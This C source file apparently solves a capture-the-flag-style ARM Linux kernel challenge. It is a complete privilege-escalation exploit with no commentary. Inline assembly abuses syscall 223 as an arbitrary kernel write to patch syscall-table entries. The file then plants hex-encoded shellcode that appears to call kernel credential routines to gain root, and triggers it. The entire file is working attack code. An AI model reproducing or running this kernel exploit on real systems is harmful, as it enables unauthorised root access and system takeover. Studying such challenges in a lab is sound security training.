#include<stdio.h>

char *change = "\x13\x40\x2d\xe9\x00\x00\xa0\xe3\x3c\x40\x9f\xe5\x34\xff\x2f\xe1\x00\x40\xa0\xe1\x01\x10\x41\xe0\x04\x00\x80\xe2\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x00\xa0\xe1\x0c\x40\x9f\xe5\x34\xff\x2f\xe1\x13\x40\xbd\xe8\x1e\xff\x2f\xe1\x4c\xf4\x03\x80\x6c\xf5\x03\x80";
char *write = "\x01\x30\xd0\xe4\x01\x30\xc1\xe4\x01\x20\x52\xe2\xfb\xff\xff\xaa\x1e\xff\x2f\xe1";


char *syscall_table_223_0 = "\xfc\xca\xf5\x83";
char *syscall_table_223_1 = "\xec\xbe\xf5\x83";

char buf[100] = "iAmfLAghaHa";
char out[100];
int ret;
int exploit0()
{
	asm(
		"mov r1, %1\n"
		"mov r0, %2\n"
		"mov r7, #223\n"
		"svc #0\n"
		"mov r1, %3\n"
		"mov r0, %4\n"
		"mov r7, #223\n"
		"svc #0\n"
		"mov %0, r0\n"
	:"=r"( ret )
	:"r" ( 0x83f5cafc ), "r"( write ),
	 "r" ( 0x8000e6c4 ), "r"( syscall_table_223_0 )
	:"r0", "r1"
	);
	printf("%d\n", ret);
	puts("waa done");
	return 0;
}

int exploit1()
{
	asm(
		"mov r2, %3\n"
		"mov r1, %1\n"
		"mov r0, %2\n"
		"mov r7, #223\n"
		"svc #0\n"
		"mov r2, %6\n"
		"mov r1, %4\n"
		"mov r0, %5\n"
		"mov r7, #223\n"
		"svc #0\n"
		"mov %0, r0\n"
	:"=r"( ret )
	:"r" ( 0x83f5beec ), "r"( change ), "r"( 85 ),
	 "r" ( 0x8000e6c4 ), "r"( syscall_table_223_1 ), "r"(5)
	:"r0", "r1", "r2"
	);
	printf("%d\n", ret);
	puts("write change done");
	return 0;
}
int exploit2()
{
	asm(
		"mov r7, #223\n"
		"svc #0\n"
		"mov %0, r0\n"
	:"=r"( ret )
	:
	:"lr"
	);
	printf("%d\n", ret);
	puts("change done");

	
	return 0;
}
int test()
{
	asm(
		"mov r2, #10\n"
		"mov r1, %2\n"
		"mov r0, %1\n"
		"mov r7, #223\n"
		"svc #0\n"
		"mov %0, r0\n"
	:"=r"( ret )
	:"r"( buf ), "r"( out )
	:"lr","r1","r0","r2"
	);
	printf("%d\n", ret);
	puts(out);
}
int main()
{
	exploit0();
	test();
	exploit1();
	exploit2();
	return 0;
}
